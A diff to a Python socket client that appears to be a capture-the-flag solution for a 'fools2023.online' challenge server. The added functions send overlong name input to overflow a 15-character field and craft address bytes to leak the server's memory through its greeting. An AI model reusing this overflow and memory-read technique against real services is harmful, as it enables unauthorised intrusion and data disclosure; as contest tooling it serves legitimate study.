@@ -22,15 +22,16 @@ def connect():
     read_all_poss(timeout=3)
 
 
-out = ""
 echoing = True
 
 
 def read_all_poss(timeout=3, subsequent_timeout=2, expected_end="Ready.\n> "):
-    global out, con
+    if expected_end is None:
+        expected_end = "Ready.\n> "
+    global con
     if not con:
         raise ConnectionClosedException("Connection closed")
-    loc_out = ""
+    out = ""
     while True:
         ready_read, _ready_write, in_err = select.select([con], [], [con], timeout)
         if in_err:
@@ -39,24 +40,23 @@ def read_all_poss(timeout=3, subsequent_timeout=2, expected_end="Ready.\n> "):
             rcvd_chunk = con.recv(1024)
             if rcvd_chunk == b'':  # eof
                 con = None
-                raise ConnectionClosedException("EOF", loc_out)
+                raise ConnectionClosedException("EOF", out)
             rcvd_str = rcvd_chunk.decode('utf8', 'replace')
             if echoing:
                 print(rcvd_str, end="")
-            loc_out += rcvd_str
-            if loc_out.endswith(expected_end):
+            out += rcvd_str
+            if out.endswith(expected_end):
                 break
         else:
             break
         timeout = subsequent_timeout
-    out += loc_out
-    return loc_out
+    return out
 
 
 connect()
 
 
-def send(msg):
+def send(msg, timeout=2, expected_end=None):
     if not con:
         raise ConnectionClosedException()
     if isinstance(msg, str):
@@ -71,8 +71,8 @@ def send(msg):
             raise ConnectionClosedException("Socket error when writing", con)
         tot_sent += sent
     if echoing:
-        print(msg.decode("utf8"), end="")
-    return read_all_poss()
+        print(msg.decode("utf8", errors="replace"), end="")
+    return read_all_poss(timeout=timeout, subsequent_timeout=timeout, expected_end=expected_end)
 
 
 builtin_hex = builtins.hex
@@ -232,3 +232,53 @@ def test_comparisons(code, addr=0x2000):
     for pre, msg in ("10beefa2beef", "LHS=RHS"), ("10beefa2beee", "LHS>RHS"), ("10beefa2befe", "LHS<RHS"):
         print(f"\n\n{msg}\n")
         exec_data(pre+code, addr)
+
+
+def connect_server3():
+    global con
+    if con:
+        con.close()
+    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    con.connect(("fools2023.online", 13339))
+    read_all_poss(timeout=3, expected_end="(max 15 characters): ")
+
+
+def bytes_(x):
+    if isinstance(x, str):
+        return bytes(x, "utf8")
+    else:
+        return bytes(x)
+
+
+def overflow_server3(data, base=b"abcdefghijklmno"):
+    connect_server3()
+    out = ""
+    try:
+        out += send(bytes_(base) + bytes_(data) + b"\n", expected_end=" to leave: ", timeout=10)
+        out += send("q\n", timeout=10, expected_end=" to leave: ")
+    except ConnectionClosedException as e:
+        if len(e.args) >= 2 and e.args[0] == "EOF":
+            out += e.args[1]
+    return out
+
+
+def read_serv3_mem(base_addr):
+    name = []
+    for i in range(4):
+        name.append(0xF0)
+        addr = base_addr + i*2
+        name.append(addr % 256)
+        name.append(addr >> 8)
+
+    resp = overflow_server3("", base=name)
+
+    resp_name = re.findall(r"Welcome, (.{16})", resp)[0]
+
+    out = []
+
+    for i in range(0, 16, 4):
+        mem = fromhex(resp_name[i:i+4])
+        out.append(mem % 256)
+        out.append(mem >> 8)
+
+    return out
